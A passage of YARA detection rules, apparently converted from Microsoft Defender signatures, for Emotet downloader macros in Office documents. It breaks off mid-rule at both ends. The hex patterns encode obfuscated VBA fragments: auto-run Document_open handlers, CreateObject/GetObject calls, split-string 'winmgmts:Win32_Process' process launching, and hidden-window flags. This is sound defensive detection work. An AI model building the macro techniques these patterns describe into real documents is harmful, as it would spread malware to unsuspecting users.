        threat_id = "2147747937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 [0-16] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-9] 46 6f 72}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TB_2147747961_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TB!MTB"
        threat_id = "2147747961"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 [0-16] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 22 [0-21] 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-24] 67 [0-21] 6d [0-24] 74 [0-24] 73 [0-24] 3a [0-32] 57 [0-24] 69 [0-24] 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TC_2147747981_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TC!MTB"
        threat_id = "2147747981"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 68 69 6c 65 20 [0-21] 2e 43 72 65 61 74 65 28 [0-16] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-16] 53 65 6c 65 63 74 20 43 61 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TD_2147747988_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TD!MTB"
        threat_id = "2147747988"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-21] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 22 [0-40] 77 [0-21] 69 [0-21] 6e [0-37] 6d [0-21] 67 [0-37] 6d [0-21] 74 [0-37] 73 [0-21] 3a [0-37] 57 [0-21] 69 [0-37] 6e 33 [0-21] 32 [0-69] 22 2c 20 [0-21] 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TE_2147748009_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TE!MTB"
        threat_id = "2147748009"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-21] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 22 [0-37] 77 [0-37] 69 [0-37] 6e [0-37] 6d [0-37] 67 [0-37] 6d [0-37] 74 [0-37] 73 [0-37] 3a [0-37] 57 [0-37] 69 [0-37] 6e 33 [0-37] 32 [0-96] 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TF_2147748019_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TF!MTB"
        threat_id = "2147748019"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-21] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 [0-53] 44 69 6d 20 [0-24] 20 41 73}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TH_2147748043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TH!MTB"
        threat_id = "2147748043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-21] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 22 [0-48] 77 [0-16] 69 [0-16] 6e [0-53] 6d [0-16] 67 [0-50] 74 [0-16] 73 [0-48] 3a [0-16] 57 [0-48] 69 [0-16] 6e [0-16] 33 [0-48] 32 [0-16] 5f [0-48] 50 [0-48] 72 [0-16] 6f [0-48] 63 [0-16] 65 [0-16] 73}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 [0-90] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TG_2147748056_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TG!MTB"
        threat_id = "2147748056"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-21] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-16] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TI_2147748083_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TI!MTB"
        threat_id = "2147748083"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 [0-64] 77 [0-48] 69 [0-48] 6e [0-48] 6d [0-48] 67 [0-64] 6d [0-48] 74 [0-48] 73 [0-64] 3a}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TJ_2147748102_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TJ!MTB"
        threat_id = "2147748102"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4d 53 46 6f 72 6d 73 2c 20 54 65 78 74 42 6f 78 22 02 00 50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = ".Tag" ascii //weight: 1
        $x_1_5 = "Loop" ascii //weight: 1
        $x_1_6 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TK_2147749367_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TK!MTB"
        threat_id = "2147749367"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".Tag" ascii //weight: 1
        $x_1_5 = "Loop" ascii //weight: 1
        $x_1_6 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-90] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TL_2147749371_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TL!MTB"
        threat_id = "2147749371"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 28 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 22 [0-21] 77 [0-37] 22 20 2b 20 70 73 2c 20 73 6b 6b 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TM_2147749405_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TM!MTB"
        threat_id = "2147749405"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 54 72 69 6d 28 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TN_2147749415_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TN!MTB"
        threat_id = "2147749415"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 [0-32] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 22 [0-21] 77 [0-37] 22 20 2b 20 70 73 2c 20 73 6b 6b 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TO_2147749418_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TO!MTB"
        threat_id = "2147749418"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-1] 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 [0-32] 20 20 2b 20 4c 54 72 69 6d 28 4c 54 72 69 6d 28 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-48] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TP_2147749420_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TP!MTB"
        threat_id = "2147749420"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-24] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 [0-73] 77 [0-96] 22 20 2b 20 61 2c 20 71 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TT_2147749424_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TT!MTB"
        threat_id = "2147749424"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 24 20 2b 20 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 4c 54 72 69 6d 28 4c 54 72 69 6d 28 [0-90] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-90] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TR_2147749428_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TR!MTB"
        threat_id = "2147749428"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-37] 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-8] 44 6f 20 57 68 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_4 = "Tag))," ascii //weight: 1
        $x_1_5 = "showwindow = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TS_2147749431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TS!MTB"
        threat_id = "2147749431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-8] 44 6f 20 57 68 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 02 00 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "+ ChrW(wdKeyS) +" ascii //weight: 1
        $x_1_5 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TU_2147749437_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TU!MTB"
        threat_id = "2147749437"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 4c 54 72 69 6d 28 4c 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 22 [0-16] 3a [0-16] 77 [0-16] 69 [0-16] 6e [0-16] 33 [0-16] 32 [0-16] 5f [0-16] 22}  //weight: 1, accuracy: Low
        $x_1_4 = ".ControlTipText" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TV_2147749438_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TV!MTB"
        threat_id = "2147749438"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 22 20 2b 20 77 65 6e 2c 20 73 6b 69 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Tag" ascii //weight: 1
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TW_2147749447_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TW!MTB"
        threat_id = "2147749447"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 43 72 65 61 74 65 28 [0-24] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 4c 54 72 69 6d 28 4c 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 02 00 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "+ ChrW(wdKeyS) +" ascii //weight: 1
        $x_1_5 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TZ_2147749461_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TZ!MTB"
        threat_id = "2147749461"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-96] 22 20 2b 20 64 2c 20 45 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UA_2147749465_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UA!MTB"
        threat_id = "2147749465"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
